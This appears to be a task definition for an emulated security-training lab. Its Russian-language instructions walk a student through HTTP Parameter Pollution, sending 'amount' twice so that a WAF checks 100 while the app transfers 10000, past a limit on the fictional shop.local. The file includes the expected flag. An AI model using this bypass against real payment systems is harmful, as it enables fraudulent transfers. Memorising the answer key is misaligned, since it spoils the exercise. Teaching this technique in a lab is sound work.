@@ -1,0 +1,39 @@
+{
+  "id": "web-http-parameter-pollution",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{hpp_1s_4_pars3r_d1s4gr33m3nt}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: HTTP Parameter Pollution\n\n`shop.local/transfer?amount=` — WAF проверяет ПЕРВОЕ значение параметра, а\nприложение берёт ПОСЛЕДНЕЕ. Продублируй параметр и обойди лимит.\n\n1. В пределах лимита:\n   curl -s 'http://shop.local/transfer?amount=100'\n2. Сверх лимита (WAF блокирует):\n   curl -s 'http://shop.local/transfer?amount=10000'\n3. HPP: передай параметр дважды — WAF увидит `100`, приложение возьмёт `10000`:\n   curl -s 'http://shop.local/transfer?amount=100&amount=10000'\n4. Перевод прошёл — в ответе флаг. Запиши (последняя строка) в `found.txt`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/transfer)",
+      "cases": [
+        {
+          "match": "amount=100&amount=10000",
+          "example": "-s 'http://shop.local/transfer?amount=100&amount=10000'",
+          "output": "{\"status\":\"ok\",\"transferred\":10000,\"limit\":1000,\"waf\":\"checked amount=100\",\"app\":\"used amount=10000\",\"flag\":\"nto{hpp_1s_4_pars3r_d1s4gr33m3nt}\"}\n"
+        },
+        {
+          "match": "amount=10000",
+          "example": "-s 'http://shop.local/transfer?amount=10000'",
+          "output": "{\"error\":\"limit exceeded\",\"amount\":10000,\"limit\":1000}\n"
+        },
+        {
+          "match": "amount=100",
+          "example": "-s 'http://shop.local/transfer?amount=100'",
+          "output": "{\"status\":\"ok\",\"transferred\":100,\"limit\":1000}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/transfer?amount=.\n"
+    }
+  }
+}
